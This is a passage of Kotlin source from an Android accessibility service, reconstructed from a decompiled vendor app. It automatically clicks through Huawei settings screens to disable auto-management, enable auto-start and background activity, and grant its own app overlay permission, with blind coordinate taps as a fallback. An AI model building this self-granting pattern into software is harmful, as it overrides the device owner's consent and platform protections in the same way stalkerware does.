                    root.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
                }
            }
        }
        return false
    }

    /**
     * Turn OFF the "自动管理" switch on the app detail page.
     *
     * Vendor: when "自动管理" is checked=true, the app is restricted; turning it OFF
     * reveals the three manual sub-switches ("允许自启动" / "允许关联启动" / "允许后台活动").
     *
     * Returns true if the switch was found and is now OFF (or was already OFF).
     * `open` for test spy override.
     *
     * ADAPT: vendor m212164b1 body not decompiled; "自动管理" disable is inferred from
     * isAutoStartDialogOpened (L6572-6618) semantics: "手动管理" text indicates
     * auto-manage was already turned OFF; replica uses toggleSwitchByText targeting OFF.
     */
    open fun disableAutoManageSwitch(): Boolean {
        // AUTO_MANAGE_KEYWORDS already in companion; vendor text is "自动管理"
        return toggleSwitchByText("自动管理", targetChecked = false)
    }

    /**
     * Enable "允许自启动" / "允许关联启动" / "允许后台活动" switches.
     *
     * Vendor companion AUTO_START_SWITCH_TEXTS (L192-196):
     *   ["允许自启动","允许关联启动","允许后台活动","允許自啟動","允許關聯啟動","允許後台活動"]
     *
     * For each keyword: find switch node, if NOT checked → click (targetChecked=true).
     * Returns count of switches actually toggled (clicked).
     * `open` for test spy override.
     *
     * ADAPT: vendor AUTO_START_SWITCH_TEXTS includes Traditional Chinese variants;
     * replica iterates the same list. findSiblingSwitch walks up 3 parent levels (DFS)
     * to find the Switch class node sibling — mirrors vendor's m212176c7/m212177c8 pattern.
     */
    open fun enableAutoStartSwitches(): Int {
        val switchTexts = listOf(
            "允许自启动", "允许关联启动", "允许后台活动",
            "允許自啟動", "允許關聯啟動", "允許後台活動"
        )
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            ?: return 0
        var toggled = 0
        for (kw in switchTexts) {
            val nodes = try { root.findAccessibilityNodeInfosByText(kw) }
            catch (_: Exception) { null } ?: continue
            for (n in nodes) {
                if (!n.isVisibleToUser) continue
                val sw = findSiblingSwitch(n) ?: continue
                if (!sw.isChecked) {
                    // Switch is OFF (unchecked) — turn it ON
                    if (sw.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)) {
                        toggled++
                    }
                }
            }
        }
        return toggled
    }

    /**
     * Find a Switch-class sibling node near [textNode].
     *
     * Walks up 3 parent levels; at each level DFS-scans children for a Switch-like node.
     * Used by [enableAutoStartSwitches] to locate the toggle associated with a text label.
     *
     * ADAPT: vendor m212164b1 body not decompiled; sibling-switch pattern inferred from
     * vendor m212176c7 (L6032) + m212177c8 (L6048) (already used in findSwitchNearNode).
     * Uses [SwitchNodeFinder.isSwitchLike] for className matching.
     */
    internal fun findSiblingSwitch(textNode: android.view.accessibility.AccessibilityNodeInfo?): android.view.accessibility.AccessibilityNodeInfo? {
        if (textNode == null) return null
        // Check the node itself first
        if (SwitchNodeFinder.isSwitchLike(textNode) || textNode.isCheckable) return textNode
        var parent: android.view.accessibility.AccessibilityNodeInfo? = try { textNode.parent } catch (_: Exception) { null }
        var depth = 0
        while (parent != null && depth < 3) {
            // DFS children of this parent for a switch-like node (excluding textNode itself)
            for (i in 0 until parent.childCount) {
                val child = try { parent.getChild(i) } catch (_: Exception) { null } ?: continue
                if (SwitchNodeFinder.isSwitchLike(child) || child.isCheckable) return child
            }
            parent = try { parent.parent } catch (_: Exception) { null }
            depth++
        }
        return null
    }

    // =========================================================================
    // Step 6/10 — 悬浮窗权限 (vendor m212172b9, L4566-5805)  **Bug B 修复**
    // =========================================================================

    /**
     * Vendor C0365a2 m212172b9 (L4566-5805) — 悬浮窗权限 Step 6/10.
     *
     * Vendor flow (distilled from the 1239-line coroutine state-machine decompile):
     *
     *  **pre-check (L4744):** `Settings.canDrawOverlays(context)` → already granted, log and return.
     *
     *  **outer retry loop (L4669 `int i34 = 4`):** `i28 = 1; i28 < 4` (max 3 attempts).
     *    For each attempt:
     *    1. Start `ACTION_MANAGE_OVERLAY_PERMISSION` intent (flags 276824064) (L4754-4756).
     *    2. `m212214h2(5000L)` = waitForOverlayListLoaded — polls up to 5s for "允许"/"不允许"
     *       text in the overlay app-list; returns `true` if TIMED OUT (i.e., list NOT loaded),
     *       `false` if list IS loaded (success). (L4762-4800)
     *    3. If TIMED OUT (true) → performGlobalAction(BACK), delay 300ms + 500ms → retry. (L4768-4802)
     *    4. If list IS loaded (false) → step 3: `m212160a3("搜索应用", true)` (L4805) → delay 500ms.
     *    5. Step 4: iterate `OVERLAY_SEARCH_BOX_IDS` to find search-box node →
     *       `performAction(ACTION_FOCUS)` → delay 100ms →
     *       `performAction(ACTION_SET_TEXT, bundle)` with `appLabel` (L4813-4834).
     *    6. Step 5: delay 1000ms (wait for search results). (L4846)
     *    7. `m212217h5(appLabel)` = searchForAppInOverlayList — additional wait for app row. (L4851)
     *    8. Step 6: `m212157a0(appLabel)` = clickAppInList → click first visible+clickable node
     *       by text, walk up 5 parent levels, fallback to coordinate tap. (L4856)
     *    9. If click succeeds → delay 300ms → step 7: verify `m212191e7()` (isOnOverlayDetailPage).
     *    10. If on detail page → step 8: try `OVERLAY_SWITCH_TEXTS` in order (L4940-4948);
     *        if all fail → coordinate click (screen-width * 0.85/0.88/0.9 × height * 0.25/0.26/0.27).
     *    11. After switch attempt: if `Settings.canDrawOverlays()` still false → try
     *        `m212158a1()` (clickFirstSwitch) up to 6 times × 100ms. (L5089-5226)
     *    12. If still not on detail page → performGlobalAction(BACK) × 2, delay → retry outer loop.
     *
     * ADAPT:
     *  - `canDrawOverlaysNow`, `waitForOverlayListLoaded`, `clickSearchButton`,
     *    `findAndFocusSearchBox`, `setSearchBoxText`, `searchForAppInOverlayList`,
     *    `clickAppInOverlayList`, `isOnOverlayDetailPageNow`, `toggleOverlaySwitch`,
     *    `clickFirstSwitchOnDetailPage` are `open` for Mockito spy overrides in tests.
     *  - Coordinate click fallback (L4958-5047) deferred: marked // TODO: VENDOR_VERIFY.
     *    Real-device test (T19) will confirm whether text-based path is sufficient.
     *  - m212217h5 (searchForAppInOverlayList) is a suspend coroutine in vendor; replica
     *    implements equivalent logic inline as a simple delay+click (L4839-4851 pattern).
     *  - ACTION_SET_TEXT constant value 2097152 = vendor L4831 `accessibilityNodeInfo.performAction(2097152, bundle)`.
     *  - Intent flags 276824064 = vendor L4755 `intent.setFlags(276824064)`.
     */
    open suspend fun executeStep6OverlayPermission(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        android.util.Log.i("HuaweiSteps", "[Step6/10] enter executeStep6OverlayPermission")
        HuaweiStepLogger.phase(6, "悬浮窗权限开始", "vendor m212172b9 L4566", logs)

        if (canDrawOverlaysNow()) {
            HuaweiStepCompletionStore.markCompleted(context, HuaweiStepCompletionStore.Keys.STEP6_OVERLAY)
            HuaweiStepLogger.success(6, "已有悬浮窗权限，跳过", "vendor L4744-4747", successes)
            return
        }

        // Vendor L4669: outer retry `i28 = 1; i28 < 4` → max 3 attempts
        val maxAttempts = 3
        for (attempt in 1..maxAttempts) {
            logs.add("[Step6/10] 第 $attempt 次尝试 (vendor outer loop L4752)")
            try {
                // Vendor L4754-4756: start overlay permission settings
                logs.add("[Step6/10] 步骤1: 打开悬浮窗设置 (vendor L4753)")
                val intent = android.content.Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION").apply {
                    // Vendor L4755: intent.setFlags(276824064)
                    setFlags(276824064)
                }
                val launcher: android.content.Context = service ?: context
                launcher.startActivity(intent)

                // ADAPT: real-device hardening — HarmonyOS 4.2 (FIN-AL60) 可能在 MANAGE_OVERLAY_PERMISSION
                // 之后直接跳到 app 的悬浮窗详情页而非列表页，导致 waitForOverlayListLoaded 5s 超时 × 3 次。
                // 检测页面类型：若已是 DETAIL 页，直接切换开关后 return；否则走 vendor 主路径（列表页搜索）。
                delay(500L) // 等待页面渲染
                val detectorRoot = try { service?.rootInActiveWindow } catch (_: Exception) { null }
                val pageType = OverlayListDetector.detect(detectorRoot)
                HuaweiStepLogger.probe(6, "page type after MANAGE_OVERLAY_PERMISSION", pageType)
                if (pageType == OverlayListDetector.PageType.DETAIL) {
                    logs.add("[Step6/10] DETAIL 页直达 fallback (ADAPT real-device hardening)")
                    val toggled = toggleOverlaySwitch()
                    HuaweiStepLogger.probe(6, "toggleOverlaySwitch (detail path)", toggled)
                    if (toggled) {
                        HuaweiStepCompletionStore.markCompleted(context, HuaweiStepCompletionStore.Keys.STEP6_OVERLAY)
                        HuaweiStepLogger.success(6, "悬浮窗开关已切换（详情页 fallback）", "", successes)
                        return
                    }
                    // 切换失败则继续 vendor 主路径（waitForOverlayListLoaded）
                }

                // Vendor L4757: log "等待列表加载 (超时5秒)"
                logs.add("[Step6/10] 步骤2: 等待列表加载(超时5秒) (vendor L4757)")
                // Vendor L4762: m212214h2(5000L) → true=timeout (list NOT loaded), false=loaded
                val timedOut = waitForOverlayListLoaded(5000L)

                if (timedOut) {
                    // Vendor L4767-4802: list not loaded → back × 2 + retry
                    logs.add("[Step6/10] 列表未加载，返回后重新开始 (vendor L4767)")
                    try { service?.performGlobalAction(1) } catch (_: Exception) { }
                    delay(300L) // vendor L4774
                    try { service?.performGlobalAction(1) } catch (_: Exception) { }
                    delay(500L) // vendor L4782
                    continue // retry outer loop
                }

                // List IS loaded (timedOut=false) → proceed with search strategy
                // Vendor L4804: step 3 — click "搜索应用"
                logs.add("[Step6/10] 步骤3: 点击搜索应用 (vendor L4804-4805)")
                clickSearchButton() // m212160a3("搜索应用", z11)
                delay(500L) // vendor L4811 b81.m210571b1(500L, ...)

                // Vendor L4812: step 4 — input appLabel into search box
                logs.add("[Step6/10] 步骤4: 输入应用名 (vendor L4812)")
                val searchBox = findAndFocusSearchBox()
                if (searchBox != null) {
                    delay(100L) // vendor L4827 b81.m210571b1(100L, ...) after ACTION_FOCUS
                    setSearchBoxText(searchBox, appLabel)
                    logs.add("[Step6/10] 输入: $appLabel (vendor L4832)")
                } else {
                    logs.add("[Step6/10] 未找到搜索框 viewId (vendor L4836-4837)")
                }

                // Vendor L4839: step 5 — wait for search results
                logs.add("[Step6/10] 步骤5: 等待搜索结果 (vendor L4839)")
                delay(1000L) // vendor L4846 b81.m210571b1(1000L, ...)

                // Vendor L4851: m212217h5(appLabel) — additional wait for app in search results
                val appeared = searchForAppInOverlayList(appLabel)
                // vendor: if appeared returns false (app visible), continue; if true (still waiting), may continue anyway

                // Vendor L4855: step 6 — click app in list (m212157a0)
                logs.add("[Step6/10] 步骤6: 点击应用 (vendor L4855-4856)")
                val appClicked = clickAppInOverlayList(appLabel)

                if (!appClicked) {
                    // ADAPT: vendor-alignment P2-6 — 列表页坐标 fallback
                    // 对齐 vendor L5800-5850：搜索 + 文本匹配都失败 → 盲点默认坐标
                    // 按屏幕宽度 3 档 (≤720 / ≤1080 / >1080) 返回 (x%, y%) 点击位置
                    val svc = service
                    if (svc != null && !canDrawOverlaysNow()) {
                        val (fx, fy) = getOverlayListFallbackPoint(
                            getScreenWidthPx(), getScreenHeightPx()
                        )
                        HuaweiStepLogger.probe(6, "list-coord-fallback", "tap ($fx,$fy)")
                        logs.add("║ [Step6/10] list-coord-fallback tap ($fx, $fy)")
                        GestureTapHelper.performTap(svc, fx, fy, durationMs = GestureTapHelper.TAP_DURATION_MS_SHORT)
                        delay(800L)
                        // 盲点后再次尝试一次列表点击（可能已进入详情页或应用行已暴露）
                        if (canDrawOverlaysNow()) {
                            HuaweiStepCompletionStore.markCompleted(context, HuaweiStepCompletionStore.Keys.STEP6_OVERLAY)
                            successes.add("[Step6/10] 悬浮窗权限已开启（列表坐标 fallback）")
                            return
                        }
                    }

                    // Vendor L5256-5286: app not found → back × 2 + retry
                    logs.add("[Step6/10] 未找到应用，返回后重新开始 (vendor L5256)")
                    try { service?.performGlobalAction(1) } catch (_: Exception) { }
                    delay(300L) // vendor L5263
                    try { service?.performGlobalAction(1) } catch (_: Exception) { }
                    delay(500L) // vendor L5270
                    continue
                }

                // Vendor L4879: delay 300ms before verify
                delay(500L) // ADAPT: 300→500ms 给华为详情页更多渲染时间

                // Vendor L4880: step 7 — verify we're on overlay detail page (m212191e7)
                val detailCheck = isOnOverlayDetailPageNow()
                android.util.Log.i("HuaweiSteps", "[Step6/10] 🔍 isOnOverlayDetailPageNow=$detailCheck, canDrawOverlays=${canDrawOverlaysNow()}")
                // ADAPT: 华为可能直接在列表页切换成功 — 先检查权限
                if (canDrawOverlaysNow()) {
                    android.util.Log.i("HuaweiSteps", "[Step6/10] ✅ 列表页直接切换成功 — canDrawOverlays=true")
                    HuaweiStepCompletionStore.markCompleted(context, HuaweiStepCompletionStore.Keys.STEP6_OVERLAY)
                    successes.add("[Step6/10] 悬浮窗权限已开启（列表页切换）")
                    return
                }
                if (!detailCheck) {
                    // Vendor L4907-4936: not on detail page → back × 2 + retry
                    logs.add("[Step6/10] 未进入悬浮窗详情页，返回后重新开始 (vendor L4907)")
                    try { service?.performGlobalAction(1) } catch (_: Exception) { }
                    delay(300L) // vendor L4914
                    try { service?.performGlobalAction(1) } catch (_: Exception) { }
                    delay(500L) // vendor L4921
                    continue
                }

                // Vendor L4939: step 8 — toggle overlay switch
                android.util.Log.i("HuaweiSteps", "[Step6/10] ▶ 步骤8: toggleOverlaySwitch (on detail page)")
                val toggled = toggleOverlaySwitch()
                android.util.Log.i("HuaweiSteps", "[Step6/10] 🔍 toggleOverlaySwitch=$toggled, canDrawOverlays=${canDrawOverlaysNow()}")

                // Verify permission granted
                if (canDrawOverlaysNow()) {
                    logs.add("[Step6/10] 完成 (vendor L5080)")
                    HuaweiStepCompletionStore.markCompleted(context, HuaweiStepCompletionStore.Keys.STEP6_OVERLAY)
                    successes.add("[Step6/10] 悬浮窗权限已开启")
                    return
                }

                if (toggled) {
                    // Best-effort: switch was clicked but canDrawOverlays still false
                    // Vendor L5089-5226: try clickFirstSwitch up to 6 times
                    var switchClicked = false
                    for (swAttempt in 0 until 6) {
                        delay(100L) // vendor L5195
                        // ADAPT: Step 6 目标=开启悬浮窗 → targetChecked=true（已开启跳过）
                        switchClicked = clickFirstSwitchOnDetailPage(targetChecked = true)
                        if (switchClicked && canDrawOverlaysNow()) {
                            logs.add("[Step6/10] 开关点击成功 (vendor L5161)")
                            HuaweiStepCompletionStore.markCompleted(context, HuaweiStepCompletionStore.Keys.STEP6_OVERLAY)
                            successes.add("[Step6/10] 悬浮窗权限已开启")
                            return
                        }
                    }
                    logs.add("[Step6/10] 开关点击后仍未授权 (vendor L5089)")
                }

                // Final verify after exhausting switch attempts
                if (canDrawOverlaysNow()) {
                    HuaweiStepCompletionStore.markCompleted(context, HuaweiStepCompletionStore.Keys.STEP6_OVERLAY)
                    successes.add("[Step6/10] 悬浮窗权限已开启")
                    return
                }

            } catch (e: Exception) {
                // Vendor L4699-4711: catch Exception → log + increment retry counter
                logs.add("[Step6/10] 异常: ${e.message} (vendor L4699)")
                // Continue outer loop
            }
        }

        // After 3 attempts without success
        logs.add("[Step6/10] 3次尝试后流程结束 (vendor outer loop exhausted)")
    }

    // ---- Step 6 open helpers (extracted for testability) ----

    /**
     * Vendor L4744: `Settings.canDrawOverlays(context)`.
     *
     * Extracted as `open` for Mockito spy override — `Settings.canDrawOverlays()` is a
     * static call that Robolectric cannot easily stub without full shadow setup.
     *
     * ADAPT: replaces inline `Settings.canDrawOverlays(this.f55062a0)` with open method.
     */
    open fun canDrawOverlaysNow(): Boolean {
        // 主路径：Settings.canDrawOverlays (vendor 原版)
        val canDraw = try {
            android.provider.Settings.canDrawOverlays(context)
        } catch (_: Exception) { false }
        if (!canDraw) return false

        // ADAPT: 真机加固 — canDrawOverlays() 对 MODE_DEFAULT 返回 true,
        // 但 appops 可能是 "default; rejectTime=..."（用户点过拒绝）。
        // 精确校验 OP_SYSTEM_ALERT_WINDOW == MODE_ALLOWED, MODE_DEFAULT 不算授权。
        return try {
            val appOps = context.getSystemService(android.content.Context.APP_OPS_SERVICE)
                as? android.app.AppOpsManager ?: return canDraw
            val mode = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                appOps.unsafeCheckOpNoThrow(
                    android.app.AppOpsManager.OPSTR_SYSTEM_ALERT_WINDOW,
                    android.os.Process.myUid(),
                    context.packageName
                )
            } else {
                @Suppress("DEPRECATION")
                appOps.checkOpNoThrow(
                    android.app.AppOpsManager.OPSTR_SYSTEM_ALERT_WINDOW,
                    android.os.Process.myUid(),
                    context.packageName
                )
            }
            val granted = mode == android.app.AppOpsManager.MODE_ALLOWED
            android.util.Log.d("HuaweiSteps", "[Step6] canDrawOverlaysNow: canDraw=$canDraw appOpsMode=$mode granted=$granted")
            granted
        } catch (_: Exception) {
            canDraw
        }
    }

    /**
     * Vendor m212214h2 (L8397) — `waitForOverlayListLoaded(timeoutMs)`.
     *
     * Polls rootInActiveWindow up to [timeoutMs] ms; looks for any of "允许"/"不允许" text
     * in the overlay app-list (vendor m212145a7 DFS text collector). Returns:
     *  - `false` (list IS loaded — success path, continue to search)
     *  - `true`  (timed out — list NOT loaded, caller should retry)
     *
     * Vendor semantics: timeout → returns Boolean.TRUE = timed-out, found → returns Boolean.FALSE.
     * This **inverted** boolean convention is preserved 1:1.
     *
     * `open` for test spy override.
     *
     * ADAPT: vendor polls every 200ms with internal state-machine; replica uses a simple
     * suspend loop. Polling keywords "允许"/"不允许" match vendor L8434-8486 count logic.
     */
    open suspend fun waitForOverlayListLoaded(timeoutMs: Long): Boolean {
        val deadline = System.currentTimeMillis() + timeoutMs
        while (System.currentTimeMillis() < deadline) {
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            if (root != null) {
                val texts = HuaweiPageDetector.collectTexts(root)
                // Vendor L8486: count entries matching "允许" or "不允许"; if >= 1 → loaded
                val count = texts.count { t ->
                    t.contains("允许") || t.contains("不允许")
                }
                if (count >= 1) {
                    return false // list loaded = success
                }
            }
            delay(200L) // vendor L8523 b81.m210571b1(200L, ...)
        }
        // Timeout: vendor L8550 returns Boolean.TRUE
        return true
    }

    /**
     * Vendor m212160a3("搜索应用", true) (L4805) — click "搜索应用" button.
     *
     * Delegates to [clickTextOnCurrentRoot] with exact=true.
     * `open` for test spy override.
     */
    open fun clickSearchButton(): Boolean {
        return clickTextOnCurrentRoot("搜索应用", exact = true)
    }

    /**
     * Vendor m212172b9 L4813-4828 — find search-box node by OVERLAY_SEARCH_BOX_IDS,
     * perform ACTION_FOCUS, return the node (or null if not found).
     *
     * Vendor iterates `strArr = {"android:id/search_src_text", "com.android.settings:id/...",
     * "com.hihonor.settings:id/..."}` and uses `findAccessibilityNodeInfosByViewId`.
     *
     * ADAPT: vendor calls `performAction(z11 ? 1 : 0)` where z11=true → ACTION_ACCESSIBILITY_FOCUS=1.
     * Replica uses `ACTION_FOCUS=1` which is the same integer value.
     * `open` for test spy override.
     */
    open fun findAndFocusSearchBox(): AccessibilityNodeInfo? {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return null
        for (viewId in OVERLAY_SEARCH_BOX_IDS) {
            val nodes = try {
                root.findAccessibilityNodeInfosByViewId(viewId)
            } catch (_: Exception) { null }
            if (!nodes.isNullOrEmpty()) {
                val node = nodes[0]
                // Vendor L4820: performAction(z11 ? 1 : 0) = ACTION_FOCUS (1)
                node.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
                return node
            }
        }
        return null
    }

    /**
     * Vendor m212172b9 L4829-4831 — set [text] into [node] via ACTION_SET_TEXT.
     *
     * Vendor L4830: `bundle.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", m212178d1())`
     * Vendor L4831: `accessibilityNodeInfo.performAction(2097152, bundle)`
     *   where 2097152 = AccessibilityNodeInfo.ACTION_SET_TEXT.
     *
     * ADAPT: `open` so tests can intercept the text-setting call without needing a real node.
     */
    open fun setSearchBoxText(node: AccessibilityNodeInfo, text: String) {
        val bundle = android.os.Bundle().apply {
            putCharSequence(
                // Vendor L4830: "ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE" (literal key string)
                "ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE",
                text
            )
        }
        // Vendor L4831: performAction(2097152, bundle) = ACTION_SET_TEXT
        node.performAction(2097152, bundle)
    }

    /**
     * Vendor m212217h5 (L7487) — `searchForAppInOverlayList(appLabel)`.
     *
     * In vendor this is a coroutine that waits for the app's row to appear in the
     * search results (calls m212212h0 = waitForAppList internally). Returns a Boolean:
     * false=found, true=not found / error.
     *
     * Replica: simplified to a brief poll loop (up to 10 × 100ms = 1s) looking for
     * `appLabel` text visible in the current window.
     *
     * ADAPT: vendor m212217h5 has a full DFS search + ACTION_SET_TEXT retry logic; here
     * we implement the observable effect (wait for text to appear). Mark for real-device
     * verification.
     * // TODO: VENDOR_VERIFY — m212217h5 full logic includes re-entering search-box text;
     *   replica only waits passively.
     *
     * `open` for test spy override.
     */
    open suspend fun searchForAppInOverlayList(appLabel: String): Boolean {
        for (poll in 0 until 10) {
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            if (root != null) {
                val nodes = try {
                    root.findAccessibilityNodeInfosByText(appLabel)
                } catch (_: Exception) { null }
                if (!nodes.isNullOrEmpty() && nodes.any { it.isVisibleToUser }) {
                    return false // found = success (vendor returns false=found)
                }
            }
            delay(100L)
        }
        return true // not found = timed-out (vendor returns true=not-found)
    }

    /**
     * Vendor m212157a0 (L782-808) — `clickAppInList(appLabel)`.
     *
     * Finds visible nodes by text, tries direct click → walk up 5 parents → gesture fallback.
     * Returns true on first success.
     *
     * ADAPT: vendor L800 includes `m212198f5(accessibilityNodeInfo)` gesture fallback;
     * replica uses [performClickOnNodeOrAncestors] (which does up-to-10 ancestor walk but
     * no gesture). Gesture fallback deferred — // TODO: VENDOR_VERIFY for gesture path.
     * `open` for test spy override.
     */
    open fun clickAppInOverlayList(appLabel: String): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false

        // ADAPT: real-device hardening — 华为 HarmonyOS 4.2 悬浮窗列表页每行直接有
        // "允许"/"不允许" 文字可点击切换，不需要进详情页。真机 UI dump 确认：
        //   text="搜索应用" / text="显示在其他应用的上层" / text="允许" / text="不允许" + app 名
        // 策略：找到 appLabel 节点 → 遍历其 parent 的 siblings 找 "不允许" → click "不允许"
        val appNodes = try {
            root.findAccessibilityNodeInfosByText(appLabel)
        } catch (_: Exception) { null } ?: return false

        for (n in appNodes) {
            if (!n.isVisibleToUser) continue
            android.util.Log.d("HuaweiSteps", "[Step6 overlay] 找到 appLabel 节点: ${n.text}")

            // 华为适配：在 appLabel 行中找 "不允许" 并点击
            val toggleNode = findSiblingText(n, "不允许", maxDepth = 4)
            if (toggleNode != null && toggleNode.isClickable) {
                android.util.Log.i("HuaweiSteps", "[Step6 overlay] ✅ 列表页直接点击 '不允许' → 切换为 '允许'")
                toggleNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                return true
            }
            // "不允许" 不可点击或没找到 → 尝试点击 "不允许" 的 clickable parent
            if (toggleNode != null) {
                val clickResult = performClickOnNodeOrAncestors(toggleNode)
                if (clickResult) {
                    android.util.Log.i("HuaweiSteps", "[Step6 overlay] ✅ 通过 parent 点击 '不允许'")
                    return true
                }
            }

            // Fallback: 点 app 名字进详情页（vendor 原版策略）
            if (n.isClickable && n.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                android.util.Log.d("HuaweiSteps", "[Step6 overlay] 点击 appLabel 进入详情页 (vendor 路径)")
                return true
            }
            var parent: AccessibilityNodeInfo? = try { n.parent } catch (_: Exception) { null }
            var depth = 0
            while (parent != null && depth < 5) {
                if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    return true
                }
                parent = try { parent.parent } catch (_: Exception) { null }
                depth++
            }
        }
        return false
    }

    /**
     * 在 node 的 parent/sibling 中查找包含指定 text 的节点。
     * 用于华为列表页找同行的 "不允许"/"允许" 按钮。
     */
    private fun findSiblingText(
        node: AccessibilityNodeInfo,
        targetText: String,
        maxDepth: Int
    ): AccessibilityNodeInfo? {
        var parent = try { node.parent } catch (_: Exception) { null }
        var depth = 0
        while (parent != null && depth < maxDepth) {
            // 在 parent 的所有 children 里找 targetText
            val count = try { parent.childCount } catch (_: Exception) { 0 }
            for (i in 0 until count) {
                val child = try { parent.getChild(i) } catch (_: Exception) { null } ?: continue
                val txt = child.text?.toString() ?: ""
                if (txt == targetText && child.isVisibleToUser) {
                    return child
                }
            }
            parent = try { parent.parent } catch (_: Exception) { null }
            depth++
        }
        return null
    }

    /**
     * Vendor m212191e7 (L6732-6754) — `isOnOverlayDetailPage()`.
     *
     * Delegates to [HuaweiPageDetector.isOnOverlayDetailPage].
     * `open` for test spy override.
     */
    open fun isOnOverlayDetailPageNow(): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        return HuaweiPageDetector().isOnOverlayDetailPage(root)
    }

    /**
     * Vendor m212172b9 L4939-5047 — toggle overlay switch on detail page.
     *
     * Step A: iterate [OVERLAY_SWITCH_TEXTS] (6 options from vendor L4940 strArr2);
     * first match clicked via m212208g6(str3, true) = [toggleSwitchByText].
     * Step B: if all text-based attempts fail and `Settings.canDrawOverlays()` still false →
     * coordinate click at screen-width * factor × height * factor (vendor L4958-5046).
     *
     * Returns true if a switch was found+clicked (text or coordinate), false otherwise.
     *
     * ADAPT: coordinate fallback (vendor L4958-5046) is partially replicated — the screen
     * dimension ratio factors are preserved exactly from vendor; gesture dispatch
     * delegated to [GestureTapHelper.performTap] (requires suspend context).
     * // TODO: VENDOR_VERIFY — coordinate tap path needs real-device validation (T19).
     * `open` for test spy override.
     */
    open suspend fun toggleOverlaySwitch(): Boolean {
        // ADAPT: 诊断 — 先 dump 详情页所有文本到 logcat（用于发现华为真实 switch 文案）
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
        if (root != null) {
            val allTexts = HuaweiPageDetector.collectTexts(root)
            android.util.Log.i("HuaweiSteps", "[Step6/10] 🔍 详情页全部文本(${allTexts.size}): ${allTexts.take(15)}")
        }

        // Vendor L4940-4948: try switch text options in order
        for (switchText in OVERLAY_SWITCH_TEXTS) {
            val toggled = toggleSwitchByText(switchText, targetChecked = true)
            android.util.Log.d("HuaweiSteps", "[Step6/10] 🔍 toggleSwitchByText('$switchText')=$toggled")
            if (toggled) return true
        }
        // All text-based attempts failed
        if (canDrawOverlaysNow()) return true

        // ADAPT: real-device hardening — 文本匹配失败后尝试 clickFirstSwitchOnDetailPage（DFS 找 Switch）
        // Step 6 目标=开启悬浮窗 → targetChecked=true（已开启跳过）
        android.util.Log.i("HuaweiSteps", "[Step6/10] ▶ OVERLAY_SWITCH_TEXTS 全部未命中，尝试 clickFirstSwitch fallback")
        val fallback = clickFirstSwitchOnDetailPage(targetChecked = true)
        android.util.Log.i("HuaweiSteps", "[Step6/10] 🔍 clickFirstSwitchOnDetailPage=$fallback")
        if (fallback) {
            delay(500L)
            if (canDrawOverlaysNow()) return true
        }

        return false
    }

    /**
     * Vendor m212158a1 (L811-826) — `clickFirstSwitch()`.
     *
     * Finds first Switch-class node in current root via m212177c8 (DFS), performs ACTION_CLICK.
     * Used as last-resort fallback after text-based switch click fails (vendor L5100-5226).
     *
     * ADAPT: vendor m212177c8 uses SwitchNodeFinder-equivalent DFS; replica reuses
     * existing [findFirstSwitchInTree] helper.
     * `open` for test spy override.
     */
    open fun clickFirstSwitchOnDetailPage(targetChecked: Boolean? = null): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        val sw = findFirstSwitchInTree(root) ?: return false
        if (targetChecked != null && sw.isChecked == targetChecked) {
            android.util.Log.d(TAG, "clickFirstSwitchOnDetailPage: 已处于目标状态 (isChecked=$targetChecked), 跳过")
            return true
        }
        return sw.performAction(AccessibilityNodeInfo.ACTION_CLICK)
    }

    /**
     * DFS find first Switch-class node in tree (vendor m212177c8, L6048 pattern).
     *
     * Used by [clickFirstSwitchOnDetailPage]. Bounded DFS to avoid infinite recursion
     * on pathological trees.
     *
     * ADAPT: vendor m212177c8 uses a while-loop with an ArrayList stack; replica uses
     * recursive DFS with depth limit for clarity in tests.
     */
    private fun findFirstSwitchInTree(node: AccessibilityNodeInfo?, depth: Int = 0): AccessibilityNodeInfo? {
        if (node == null || depth > 20) return null
        if (SwitchNodeFinder.isSwitchLike(node) || node.isCheckable) return node
        for (i in 0 until node.childCount) {
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            val found = findFirstSwitchInTree(child, depth + 1)
            if (found != null) return found
        }
        return null
    }

    // =========================================================================
    // Step 7/10 — 通知权限 (vendor m212171b8, L4165-4565)
    // =========================================================================

    /**
     * Vendor C0365a2 m212171b8 (L4165-4565) — 关闭 OFF 频道通知 Step 7/10.
     *
     * Vendor flow (reconstructed from the coroutine state-machine decompile):
     *
     *  case 0 — entry:
     *    L4188: log "[通知] ★ 关闭 OFF 频道通知 ★"
     *    L4189: m212193f0(f55073b1) SP short-circuit → if already done, return
     *    Outer retry loop i = 1..2 (vendor: i5 < 3 → max 2 iterations):
     *      L4275: log "第 i 次尝试"
     *      L4276: construct Intent(android.settings.CHANNEL_NOTIFICATION_SETTINGS)
     *             + extra APP_PACKAGE = packageName
     *             + extra CHANNEL_ID = "OFF"
     *             + flags = 276824064
     *      L4280: f55063a1.startActivity(intent) (= service.startActivity)
     *      L4284: delay(800L) (b81.m210571b1(800L, ...))
     *      Inner poll loop i2 = 1..5 × 500ms — look for "允许通知" in rootInActiveWindow:
     *        L4302-4310: root.findAccessibilityNodeInfosByText("允许通知") → any isVisibleToUser → i3=1
     *      L4284/case 2: delay(500L) each inner poll tick
     *      After inner loop (case 2 transition):
